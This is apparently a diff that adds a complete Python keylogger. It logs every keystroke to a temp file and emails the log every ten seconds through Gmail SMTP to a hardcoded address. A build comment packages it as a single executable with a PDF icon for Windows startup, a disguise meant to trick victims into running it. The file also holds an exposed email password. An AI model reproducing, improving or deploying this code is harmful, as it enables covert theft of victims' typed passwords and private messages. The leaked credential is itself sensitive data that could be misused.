@@ -1,0 +1,84 @@
+#pyinstaller.exe --onefile --icon pdf.ico index.pyw
+#startup windows
+from pynput.keyboard import Key, Listener
+import tempfile, time
+import os, threading
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+
+def createfile() :
+    temp_dir = tempfile.gettempdir()
+    file_path = os.path.join(temp_dir, "keys.txt")
+    # file_path = C:\Users\nairr\AppData\Local\Temp\key.txt
+    obj = open(file_path, "a")
+    obj.write(" ")
+    obj.close()
+
+def sendmail() :
+    while True :
+        time.sleep(10)
+        temp_dir = tempfile.gettempdir()
+        file_path = os.path.join(temp_dir, "keys.txt")
+        # Email credentials
+        sender_email = "sniperbytesofficial@gmail.com"
+        sender_password = "kfdsffdererfujvk"  # Use App Password, not your regular password
+        receiver_email = "sniperbytesofficial@gmail.com"
+
+        # Create email
+        msg = MIMEMultipart()
+        msg["From"] = sender_email
+        msg["To"] = receiver_email
+        msg["Subject"] = "Email with Attachment"
+
+        # Email body
+        body = "Hello, this is a test email with an attachment."
+        msg.attach(MIMEText(body, "plain"))
+
+        # Attach file
+        filename = file_path  # File to attach
+        attachment = open(filename, "rb")
+
+        part = MIMEBase("application", "octet-stream")
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header("Content-Disposition", f"attachment; filename= {filename}")
+
+        msg.attach(part)
+
+        # Send email
+        try:
+            server = smtplib.SMTP("smtp.gmail.com", 587)
+            server.starttls()
+            server.login(sender_email, sender_password)
+            server.send_message(msg)
+            print("Email sent successfully!")
+        except Exception as e:
+            print(f"Error: {e}")
+        finally:
+            server.quit()
+
+
+obt = threading.Thread(target=createfile)
+obt.start()
+obt2 = threading.Thread(target=sendmail)
+obt2.start()
+
+
+def on_press(key):
+    print(key)
+    # Get temp folder path and create full file path
+    temp_dir = tempfile.gettempdir()
+    file_path = os.path.join(temp_dir, "keys.txt")
+
+    # Write keystroke to file (append mode)
+    with open(file_path, "a", encoding="utf-8") as f:
+        # Clean up the key representation for better readability
+        key_str = str(key).replace("'", "")
+        f.write(key_str + "\n")
+        f.flush()  # Force write to disk
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
